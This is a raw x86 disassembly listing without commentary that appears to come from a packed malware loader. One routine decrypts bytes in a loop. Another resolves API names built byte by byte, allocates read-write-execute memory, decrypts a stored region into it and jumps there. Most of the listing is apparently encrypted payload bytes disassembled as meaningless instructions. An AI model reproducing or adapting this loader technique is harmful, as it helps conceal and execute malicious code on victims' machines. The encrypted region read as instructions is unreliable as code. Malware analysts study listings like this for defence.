  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428100
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428104
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428108
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42810c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f0
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280f4
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x4280f8
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x4280fc
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x4280fe
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	cmp    DWORD PTR [ebp+0x8],0x0
  421630:	jne    0x42163b
  421632:	mov    eax,DWORD PTR [ebp-0x10]
  421635:	add    eax,0x1
  421638:	mov    DWORD PTR [ebp-0x10],eax
  42163b:	mov    DWORD PTR [ebp-0x48],0x0
  421642:	mov    DWORD PTR [ebp-0x4c],0x0
  421649:	push   0x1
  42164b:	lea    ecx,[ebp-0x14]
  42164e:	push   ecx
  42164f:	call   DWORD PTR ds:0x428000
  421655:	mov    BYTE PTR [ebp-0x40],0x56
  421659:	call   DWORD PTR ds:0x428010
  42165f:	mov    DWORD PTR [ebp-0x2c],eax
  421662:	mov    BYTE PTR [ebp-0x3e],0x72
  421666:	movzx  edx,WORD PTR [ebp-0x2c]
  42166a:	test   edx,edx
  42166c:	jne    0x4216ae
  42166e:	mov    BYTE PTR [ebp-0x34],0x0
  421672:	mov    DWORD PTR [ebp-0x14],0xe0d
  421679:	lea    eax,[ebp-0x28]
  42167c:	push   eax
  42167d:	call   DWORD PTR ds:0x428014
  421683:	mov    DWORD PTR [ebp-0x68],eax
  421686:	mov    DWORD PTR [ebp-0x5c],0x3a
  42168d:	lea    ecx,[ebp-0x40]
  421690:	push   ecx
  421691:	mov    edx,DWORD PTR [ebp-0x68]
  421694:	push   edx
  421695:	call   DWORD PTR ds:0x428018
  42169b:	mov    DWORD PTR [ebp-0x44],eax
  42169e:	mov    DWORD PTR [ebp-0x8],0x83ed1932
  4216a5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ac:	jmp    0x4216c3
  4216ae:	mov    BYTE PTR ds:0x443a58,0x0
  4216b5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216bc:	mov    BYTE PTR ds:0x441b18,0x0
  4216c3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216ca:	push   DWORD PTR ds:0x428014
  4216d0:	pop    edx
  4216d1:	mov    DWORD PTR [ebp-0x74],edx
  4216d4:	push   DWORD PTR [ebp-0x30]
  4216d7:	push   0x1000
  4216dc:	mov    eax,DWORD PTR [ebp-0x14]
  4216df:	add    eax,0x23
  4216e2:	add    eax,0x23
  4216e5:	push   eax
  4216e6:	xor    eax,eax
  4216e8:	push   eax
  4216e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216ec:	call   ecx
  4216ee:	mov    edx,eax
  4216f0:	mov    DWORD PTR [ebp-0x4],edx
  4216f3:	mov    eax,DWORD PTR [ebp-0x70]
  4216f6:	sub    eax,0xdae0b
  4216fb:	mov    DWORD PTR [ebp-0x70],eax
  4216fe:	cmp    DWORD PTR [ebp-0x4],0x0
  421702:	jne    0x42170b
  421704:	mov    BYTE PTR ds:0x441b18,0x0
  42170b:	mov    ecx,DWORD PTR [ebp-0x4]
  42170e:	add    ecx,DWORD PTR [ebp-0x14]
  421711:	mov    edx,DWORD PTR [ebp-0x8]
  421714:	mov    DWORD PTR [ecx],edx
  421716:	mov    eax,DWORD PTR [ebp-0x4]
  421719:	add    eax,DWORD PTR [ebp-0x5c]
  42171c:	mov    DWORD PTR [ebp-0x64],eax
  42171f:	mov    ecx,DWORD PTR ds:0x428018
  421725:	mov    DWORD PTR [ebp-0x54],ecx
  421728:	mov    edx,DWORD PTR [ebp-0x4]
  42172b:	add    edx,DWORD PTR [ebp-0x14]
  42172e:	mov    eax,DWORD PTR [ebp+0x8]
  421731:	mov    DWORD PTR [edx+0x4],eax
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	add    ecx,DWORD PTR [ebp-0x14]
  42173a:	mov    DWORD PTR [ebp-0xc],ecx
  42173d:	cmp    DWORD PTR [ebp-0x70],0x0
  421741:	jbe    0x42175e
  421743:	mov    edx,DWORD PTR [ebp-0xc]
  421746:	push   edx
  421747:	mov    eax,DWORD PTR [ebp-0x14]
  42174a:	push   eax
  42174b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42174e:	add    ecx,DWORD PTR [ebp-0x70]
  421751:	push   ecx
  421752:	mov    edx,DWORD PTR [ebp-0x4]
  421755:	push   edx
  421756:	call   0x4214d0
  42175b:	add    esp,0x10
  42175e:	cmp    DWORD PTR [ebp-0x64],0x0
  421762:	je     0x421776
  421764:	mov    ecx,DWORD PTR [ebp-0x54]
  421767:	push   ecx
  421768:	push   DWORD PTR [ebp-0x74]
  42176b:	mov    esi,DWORD PTR [ebp-0x64]
  42176e:	push   edx
  42176f:	pop    eax
  421770:	push   ecx
  421771:	nop
  421772:	jmp    esi
  421774:	jmp    0x42177c
  421776:	mov    eax,DWORD PTR [ebp+0x8]
  421779:	mov    DWORD PTR [ebp-0x18],eax
  42177c:	mov    eax,0x1
  421781:	pop    esi
  421782:	mov    esp,ebp
  421784:	pop    ebp
  421785:	ret    
  421786:	int3   
  421787:	int3   
  421788:	int3   
  421789:	int3   
  42178a:	int3   
  42178b:	int3   
  42178c:	int3   
  42178d:	int3   
  42178e:	int3   
  42178f:	int3   
  421790:	push   ebp
  421791:	mov    ebp,esp
  421793:	sub    esp,0x18
  421796:	lea    eax,[ebp-0x18]
  421799:	push   eax
  42179a:	call   DWORD PTR ds:0x42800c
  4217a0:	cmp    WORD PTR [ebp-0x18],0x0
  4217a5:	je     0x4217e8
  4217a7:	mov    ecx,DWORD PTR ds:0x428010
  4217ad:	push   0x0
  4217af:	push   0xb2
  4217b4:	push   0x82
  4217b9:	push   0x0
  4217bb:	mov    DWORD PTR [ebp-0x4],ecx
  4217be:	call   DWORD PTR ds:0x428008
  4217c4:	push   DWORD PTR [ebp-0x4]
  4217c7:	pop    edx
  4217c8:	call   edx
  4217ca:	push   eax
  4217cb:	pop    DWORD PTR [ebp-0x8]
  4217ce:	push   0x8e0c33c9
  4217d3:	call   0x421550
  4217d8:	add    esp,0x4
  4217db:	call   0x411000
  4217e0:	xor    eax,eax
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    0x10
  4217e8:	inc    DWORD PTR [ecx+eiz*2-0x6585f715]
  4217ef:	imul   edx,DWORD PTR [edx+0x64],0x3c
  4217f3:	pop    ds
  4217f4:	stc    
  4217f5:	sbb    eax,0xb07b3b36
  4217fa:	jns    0x421796
  4217fc:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421800:	pop    ds
  421801:	mov    ecx,0x7b3bc9e2
  421806:	or     BYTE PTR [ecx-0x66],bh
  421809:	imul   edx,DWORD PTR [edx+0x60],0x3c
  42180d:	pop    ds
  42180e:	stc    
  42180f:	loop   0x4217da
  421811:	cmp    edi,DWORD PTR [ebx+0x8]
  421814:	jns    0x4217b0
  421816:	imul   edx,DWORD PTR [edx+0x60],0x3c
  42181a:	pop    ds
  42181b:	stc    
  42181c:	loop   0x4217e7
  42181e:	cmp    edi,DWORD PTR [ebx+0x8]
  421821:	jns    0x4217bd
  421823:	imul   edx,DWORD PTR [edx-0x68],0x3c
  421827:	pop    ds
  421828:	stc    
  421829:	in     al,dx
  42182a:	(bad)  
  42182b:	xor    DWORD PTR [ebp+0x8],0x73a693cd
  421832:	fdivr  DWORD PTR ds:0x9dc33453
  421838:	push   ebx
  421839:	adc    bh,BYTE PTR [ebx+0x59]
  42183c:	jmp    0x947e:0x4e073d19
  421843:	ret    0x5aaa
  421846:	adc    eax,0x4bee1666
  42184b:	xor    BYTE PTR ds:0x8c8c6d1c,al
  421851:	jmp    0x3d6a2da8
  421856:	aad    0x38
  421858:	jb     0x421867
  42185a:	push   ebx
  42185b:	jnp    0x4217f9
  42185d:	int3   
  42185e:	les    esi,FWORD PTR [esi]
  421860:	jno    0x42188e
  421862:	jns    0x4217fe
  421864:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421868:	pop    ds
  421869:	(bad)  
  42186a:	jnp    0x4218a1
  42186c:	bound  edi,QWORD PTR [eax]
  42186e:	lock jmp 0x421801
  421871:	sub    BYTE PTR [edx+0x15c36f2],ch
  421877:	jo     0x42183c
  421879:	arpl   WORD PTR [esi],bx
  42187b:	add    al,0x73
  42187d:	lds    edx,FWORD PTR [ebx+0x7a646ac0]
  421883:	shr    eax,0xb
  421886:	ret    
  421887:	jmp    0x5341398e
  42188c:	pop    eax
  42188d:	or     ah,al
  42188f:	(bad)  
  421890:	repz into 
  421892:	inc    edi
  421893:	add    dh,BYTE PTR [ecx+0x4e]
  421896:	or     DWORD PTR [eax],0x2de01861
  42189c:	adc    eax,0x315b1ab3
  4218a1:	xor    DWORD PTR [eax-0x55cc6f88],ecx
  4218a7:	repnz ss pop esp
  4218aa:	add    DWORD PTR [ecx-0x3d],esi
  4218ad:	adc    eax,DWORD PTR [edx-0x4cda8c66]
  4218b3:	shr    BYTE PTR [edx+0x71],cl
  4218b6:	out    0x6b,eax
  4218b8:	call   0x288774e
  4218bd:	jno    0x421921
  4218bf:	stc    
  4218c0:	pop    eax
  4218c1:	cmp    BYTE PTR [ecx+0x17],bl
  4218c4:	repz mov al,ds:0x5071a931
  4218ca:	sbb    al,0x95
  4218cc:	popa   
  4218cd:	adc    BYTE PTR [eax-0x7454ea52],bl
  4218d3:	stos   BYTE PTR es:[edi],al
  4218d4:	push   ebx
  4218d5:	cmp    al,dh
  4218d7:	jmp    0x421869
  4218d9:	imul   edx,DWORD PTR [edx+0x60],0x3c
  4218dd:	pop    ds
  4218de:	stc    
  4218df:	loop   0x4218aa
  4218e1:	imul   edi,DWORD PTR [esi],0x8
  4218e4:	jns    0x4218bc
  4218e6:	push   0x50
  4218e8:	pusha  
  4218e9:	pushf  
  4218ea:	iret   
  4218eb:	xchg   edx,eax
  4218ec:	lods   eax,DWORD PTR ds:[esi]
  4218ed:	leave  
  4218ee:	cmp    edi,DWORD PTR [ebx+0x8]
  4218f1:	jns    0x42188d
  4218f3:	imul   edx,DWORD PTR [edx-0x80],0x3c
  4218f7:	sbb    al,0xf8
  4218f9:	jmp    0x8bd4ac6
  4218fe:	xchg   edi,eax
  4218ff:	sahf   
  421900:	imul   edx,DWORD PTR [edx-0x24],0x3a
  421904:	pop    ds
  421905:	stc    
  421906:	loop   0x4218d1
  421908:	cmp    ebp,DWORD PTR [edx-0x4b]
  42190b:	jns    0x4218a7
  42190d:	imul   eax,DWORD PTR [edx+0x60],0x3c
  421911:	pop    ds
  421912:	stc    
  421913:	out    0xc9,eax
  421915:	cmp    edi,DWORD PTR [ebx+0x49]
  421918:	jns    0x4218b4
  42191a:	jnp    0x42196e
  42191c:	pusha  
  42191d:	cmp    al,0x1d
  42191f:	stc    
  421920:	loop   0x4218ee
  421922:	cmp    edi,DWORD PTR [edx+0x8]
  421925:	jns    0x4218c1
  421927:	imul   edx,DWORD PTR [edx+0x65],0x3c
  42192b:	push   ds
  42192c:	stc    
  42192d:	loop   0x4218f8
  42192f:	cmp    edi,DWORD PTR [ebx+0x8]
  421932:	sub    DWORD PTR [esi+0x3c64526b],edx
  421938:	pop    ds
  421939:	clc    
  42193a:	push   es
  42193b:	int3   
  42193c:	cmp    edi,DWORD PTR [ecx+0x8]
  42193f:	jns    0x42195b
  421941:	imul   edx,DWORD PTR [edx+0x70],0x3c
  421945:	pop    ds
  421946:	jmp    0x7b7de32d
  42194b:	sbb    BYTE PTR [ecx-0x66],bh
  42194e:	jnp    0x4219a2
  421950:	pusha  
  421951:	cmp    al,0x1f
  421953:	stc    
  421954:	loop   0x42192f
  421956:	cmp    edi,DWORD PTR [ebx+0x8]
  421959:	jns    0x4218f5
  42195b:	imul   edx,DWORD PTR [edx+0x60],0x3c
  42195f:	pop    ds
  421960:	stc    
  421961:	push   ss
  421962:	lock aaa 
  421964:	jnp    0x4219c7
  421966:	jp     0x421902
  421968:	imul   edx,DWORD PTR [edx-0x70],0x37
  42196c:	pop    ds
  42196d:	mov    dh,0xab
  42196f:	leave  
  421970:	cmp    edi,DWORD PTR [ebx+0x8]
  421973:	jns    0x42190f
  421975:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421979:	pop    ds
  42197a:	stc    
  42197b:	loop   0x421946
  42197d:	cmp    edi,DWORD PTR [ebx+0x8]
  421980:	jns    0x42191c
  421982:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421986:	pop    ds
  421987:	stc    
  421988:	loop   0x421953
  42198a:	cmp    edi,DWORD PTR [ebx+0x8]
  42198d:	jns    0x421929
  42198f:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421993:	pop    ds
  421994:	stc    
  421995:	loop   0x421960
  421997:	cmp    edi,DWORD PTR [ebx+0x8]
  42199a:	jns    0x421936
  42199c:	imul   edx,DWORD PTR [edx+0x60],0x3c
  4219a0:	pop    ds
  4219a1:	stc    
  4219a2:	loop   0x42196d
  4219a4:	cmp    edi,DWORD PTR [ebx+0x8]
  4219a7:	jns    0x421943
  4219a9:	imul   edx,DWORD PTR [edx+0x60],0x3c
  4219ad:	pop    ds
  4219ae:	stc    
  4219af:	loop   0x42197a
  4219b1:	cmp    edi,DWORD PTR [ebx+0x8]
  4219b4:	jns    0x421950
  4219b6:	imul   edx,DWORD PTR [edx+0x60],0x3c
  4219ba:	pop    ds
  4219bb:	stc    
  4219bc:	loop   0x421987
  4219be:	cmp    edi,DWORD PTR [ebx+0x8]
  4219c1:	jns    0x42195d
  4219c3:	imul   edx,DWORD PTR [edx+0x60],0x3c
  4219c7:	pop    ds
  4219c8:	stc    
  4219c9:	loop   0x421994
  4219cb:	cmp    edi,DWORD PTR [ebx+0x8]
  4219ce:	jns    0x42196a
  4219d0:	imul   edx,DWORD PTR [edx+0x60],0x3c
  4219d4:	pop    ds
  4219d5:	stc    
  4219d6:	loop   0x4219a1
  4219d8:	cmp    edx,DWORD PTR [ebp+0x7c]
  4219db:	sbb    al,0xe2
  4219dd:	pop    ds
  4219de:	push   edx
  4219df:	pusha  
  4219e0:	cmp    al,0x1f
  4219e2:	sbb    ecx,ebp
  4219e4:	leave  
  4219e5:	cmp    ebp,DWORD PTR [ebx+0x8]
  4219e8:	jns    0x421984
  4219ea:	mov    edi,0x1b3c6056
  4219ef:	stc    
  4219f0:	loop   0x42198b
  4219f2:	jle    0x421a2c
  4219f4:	cmp    ch,BYTE PTR ds:0x60526bd5
  4219fa:	cmp    al,0x1f
  4219fc:	stc    
  4219fd:	ret    0x3bc9
  421a00:	fwait
  421a01:	es or  ebp,ecx
  421a04:	sbb    DWORD PTR [ecx],esi
  421a06:	pusha  
  421a07:	cmp    al,0x1f
  421a09:	stc    
  421a0a:	or     cl,0x3b
  421a0d:	jnp    0x421a07
  421a0f:	jb     0x4219ab
  421a11:	imul   ecx,DWORD PTR [eax],0x60
  421a14:	cmp    al,0x1f
  421a16:	and    esi,esp
  421a18:	leave  
  421a19:	cmp    edi,DWORD PTR [ebx+0x8]
  421a1c:	jns    0x4219b8
  421a1e:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421a22:	pop    ds
  421a23:	stc    
  421a24:	loop   0x421a0f
  421a26:	cmp    edi,DWORD PTR [ebx-0x18]
  421a29:	jns    0x4219c5
  421a2b:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421a2f:	pop    ds
  421a30:	stc    
  421a31:	loop   0x4219fc
  421a33:	cmp    edi,DWORD PTR [ebx+0x8]
  421a36:	jns    0x4219d2
  421a38:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421a3c:	pop    ds
  421a3d:	stc    
  421a3e:	loop   0x421a09
  421a40:	cmp    edi,DWORD PTR [ebx+0x8]
  421a43:	jns    0x4219df
  421a45:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421a49:	pop    ds
  421a4a:	stc    
  421a4b:	loop   0x421a16
  421a4d:	cmp    edi,DWORD PTR [ebx+0x8]
  421a50:	jns    0x4219ec
  421a52:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421a56:	pop    ds
  421a57:	stc    
  421a58:	loop   0x421a23
  421a5a:	cmp    edi,DWORD PTR [ebx+0x8]
  421a5d:	jns    0x4219f9
  421a5f:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421a63:	pop    ds
  421a64:	stc    
  421a65:	loop   0x421a30
  421a67:	cmp    edi,DWORD PTR [ebx+0x8]
  421a6a:	jns    0x421a06
  421a6c:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421a70:	pop    ds
  421a71:	stc    
  421a72:	loop   0x421a3d
  421a74:	cmp    edi,DWORD PTR [ebx+0x8]
  421a77:	jns    0x421a13
  421a79:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421a7d:	pop    ds
  421a7e:	stc    
  421a7f:	loop   0x421a4a
  421a81:	cmp    edi,DWORD PTR [ebx+0x8]
  421a84:	jns    0x421a20
  421a86:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421a8a:	pop    ds
  421a8b:	stc    
  421a8c:	loop   0x421a57
  421a8e:	cmp    edi,DWORD PTR [ebx+0x8]
  421a91:	jns    0x421a2d
  421a93:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421a97:	pop    ds
  421a98:	stc    
  421a99:	loop   0x421a64
  421a9b:	cmp    edi,DWORD PTR [ebx+0x8]
  421a9e:	jns    0x421a3a
  421aa0:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421aa4:	pop    ds
  421aa5:	stc    
  421aa6:	loop   0x421a71
  421aa8:	cmp    edi,DWORD PTR [ebx+0x8]
  421aab:	jns    0x421a47
  421aad:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421ab1:	pop    ds
  421ab2:	stc    
  421ab3:	loop   0x421a7e
  421ab5:	cmp    edi,DWORD PTR [ebx+0x8]
  421ab8:	jns    0x421a54
  421aba:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421abe:	pop    ds
  421abf:	stc    
  421ac0:	loop   0x421a8b
  421ac2:	cmp    edi,DWORD PTR [ebx+0x8]
  421ac5:	jns    0x421a61
  421ac7:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421acb:	pop    ds
  421acc:	stc    
  421acd:	loop   0x421a98
  421acf:	cmp    edi,DWORD PTR [ebx+0x8]
  421ad2:	jns    0x421a6e
  421ad4:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421ad8:	pop    ds
  421ad9:	stc    
  421ada:	loop   0x421aa5
  421adc:	cmp    edi,DWORD PTR [ebx+0x8]
  421adf:	jns    0x421a7b
  421ae1:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421ae5:	pop    ds
  421ae6:	stc    
  421ae7:	loop   0x421ab2
  421ae9:	cmp    edi,DWORD PTR [ebx+0x8]
  421aec:	jns    0x421a88
  421aee:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421af2:	pop    ds
  421af3:	stc    
  421af4:	loop   0x421abf
  421af6:	cmp    edi,DWORD PTR [ebx+0x8]
  421af9:	jns    0x421a95
  421afb:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421aff:	pop    ds
  421b00:	stc    
  421b01:	loop   0x421acc
  421b03:	cmp    edi,DWORD PTR [ebx+0x8]
  421b06:	jns    0x421aa2
  421b08:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b0c:	pop    ds
  421b0d:	stc    
  421b0e:	loop   0x421ad9
  421b10:	cmp    edi,DWORD PTR [ebx+0x8]
  421b13:	jns    0x421aaf
  421b15:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b19:	pop    ds
  421b1a:	stc    
  421b1b:	loop   0x421ae6
  421b1d:	cmp    edi,DWORD PTR [ebx+0x8]
  421b20:	jns    0x421abc
  421b22:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b26:	pop    ds
  421b27:	stc    
  421b28:	loop   0x421af3
  421b2a:	cmp    edi,DWORD PTR [ebx+0x8]
  421b2d:	jns    0x421ac9
  421b2f:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b33:	pop    ds
  421b34:	stc    
  421b35:	loop   0x421b00
  421b37:	cmp    edi,DWORD PTR [ebx+0x8]
  421b3a:	jns    0x421ad6
  421b3c:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b40:	pop    ds
  421b41:	stc    
  421b42:	loop   0x421b0d
  421b44:	cmp    edi,DWORD PTR [ebx+0x8]
  421b47:	jns    0x421ae3
  421b49:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b4d:	pop    ds
  421b4e:	stc    
  421b4f:	loop   0x421b1a
  421b51:	cmp    edi,DWORD PTR [ebx+0x8]
  421b54:	jns    0x421af0
  421b56:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b5a:	pop    ds
  421b5b:	stc    
  421b5c:	loop   0x421b27
  421b5e:	cmp    edi,DWORD PTR [ebx+0x8]
  421b61:	jns    0x421afd
  421b63:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b67:	pop    ds
  421b68:	stc    
  421b69:	loop   0x421b34
  421b6b:	cmp    edi,DWORD PTR [ebx+0x8]
  421b6e:	jns    0x421b0a
  421b70:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b74:	pop    ds
  421b75:	stc    
  421b76:	loop   0x421b41
  421b78:	cmp    edi,DWORD PTR [ebx+0x8]
  421b7b:	jns    0x421b17
  421b7d:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b81:	pop    ds
  421b82:	stc    
  421b83:	loop   0x421b4e
  421b85:	cmp    edi,DWORD PTR [ebx+0x8]
  421b88:	jns    0x421b24
  421b8a:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b8e:	pop    ds
  421b8f:	stc    
  421b90:	loop   0x421b5b
  421b92:	cmp    edi,DWORD PTR [ebx+0x8]
  421b95:	jns    0x421b31
  421b97:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421b9b:	pop    ds
  421b9c:	stc    
  421b9d:	loop   0x421b68
  421b9f:	cmp    edi,DWORD PTR [ebx+0x8]
  421ba2:	jns    0x421b3e
  421ba4:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421ba8:	pop    ds
  421ba9:	stc    
  421baa:	loop   0x421b75
  421bac:	cmp    edi,DWORD PTR [ebx+0x8]
  421baf:	jns    0x421b4b
  421bb1:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421bb5:	pop    ds
  421bb6:	stc    
  421bb7:	loop   0x421b82
  421bb9:	cmp    edi,DWORD PTR [ebx+0x8]
  421bbc:	jns    0x421b58
  421bbe:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421bc2:	pop    ds
  421bc3:	stc    
  421bc4:	loop   0x421b8f
  421bc6:	cmp    edi,DWORD PTR [ebx+0x8]
  421bc9:	jns    0x421b65
  421bcb:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421bcf:	pop    ds
  421bd0:	stc    
  421bd1:	loop   0x421b9c
  421bd3:	cmp    edi,DWORD PTR [ebx+0x8]
  421bd6:	jns    0x421b72
  421bd8:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421bdc:	pop    ds
  421bdd:	stc    
  421bde:	loop   0x421ba9
  421be0:	cmp    edi,DWORD PTR [ebx+0x8]
  421be3:	jns    0x421b7f
  421be5:	imul   edx,DWORD PTR [edx+0x60],0x3c
  421be9:	jo     0x421c3c
  421beb:	jmp    0x8bd30b9
  421bf0:	imul   ebx,DWORD PTR [edx-0x193d8795],0xe41d9f6e
  421bfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bfb:	cld    
  421bfc:	pop    eax
  421bfd:	xchg   esp,eax
  421bfe:	lods   al,BYTE PTR ds:[esi]
  421bff:	add    DWORD PTR [ecx-0x2c],0xffffffa9
  421c03:	jns    0x421b8d
  421c05:	xchg   bx,ax
  421c07:	sub    dl,cl
  421c09:	mov    edi,0xd88ff76f
  421c0e:	loope  0x421c0a
  421c10:	xor    DWORD PTR [ebx+0x4802f672],ebx
  421c16:	inc    edi
  421c17:	enter  0x498d,0x52
  421c1b:	inc    edi
  421c1c:	fwait
  421c1d:	xchg   edi,eax
  421c1e:	lods   al,BYTE PTR ds:[esi]
  421c1f:	mov    bl,0xa4
  421c21:	xchg   edx,eax
  421c22:	dec    ecx
  421c23:	xor    eax,0x32da8ea4
  421c28:	outs   dx,DWORD PTR ds:[esi]
  421c29:	loop   0x421c66
  421c2b:	inc    edx
  421c2c:	scas   al,BYTE PTR es:[edi]
  421c2d:	sbb    bh,dh
  421c2f:	push   esp
  421c30:	lock out 0x90,eax
  421c33:	test   BYTE PTR [esi],dh
  421c35:	inc    eax
  421c36:	lahf   
  421c37:	adc    BYTE PTR [eax],cl
  421c39:	dec    eax
  421c3a:	in     al,0x7e
  421c3c:	add    ecx,DWORD PTR [esi+0x28]
  421c3f:	fldenv [ebp+0x621526e3]
  421c45:	arpl   WORD PTR fs:[ebx-0x4438327],dx
  421c4c:	test   eax,0xcc41b600
  421c51:	jle    0x421cc5
  421c53:	sub    BYTE PTR [edi+0x2f],0x57
  421c57:	out    dx,eax
  421c58:	shl    BYTE PTR [edx-0x63a04ae0],cl
  421c5e:	add    al,0xa6
  421c60:	push   eax
  421c61:	jae    0x421ce0
  421c63:	(bad)  
  421c64:	jae    0x421cb6
  421c66:	fadd   DWORD PTR [ebp-0x53]
  421c69:	push   ecx
  421c6a:	or     eax,0xa7ed4ed3
  421c6f:	cdq    
  421c70:	and    eax,0x2e9054b5
  421c75:	xchg   esi,eax
  421c76:	cmc    
  421c77:	jne    0x421c09
  421c79:	retf   0xda86
  421c7c:	dec    edi
  421c7d:	cld    
  421c7e:	and    BYTE PTR [ebx],bh
  421c80:	(bad)  
  421c81:	in     eax,dx
  421c82:	out    dx,eax
  421c83:	dec    ebp
  421c84:	into   
  421c85:	adc    eax,0x88d1b375
  421c8a:	jge    0x421c33
  421c8c:	xor    ebp,DWORD PTR [edx+0x71]
  421c8f:	(bad)  [eax]
  421c91:	jae    0x421c9a
  421c93:	aad    0x54
  421c95:	and    eax,DWORD PTR [ebx+0x6bef2401]
  421c9b:	in     al,0x38
  421c9d:	push   eax
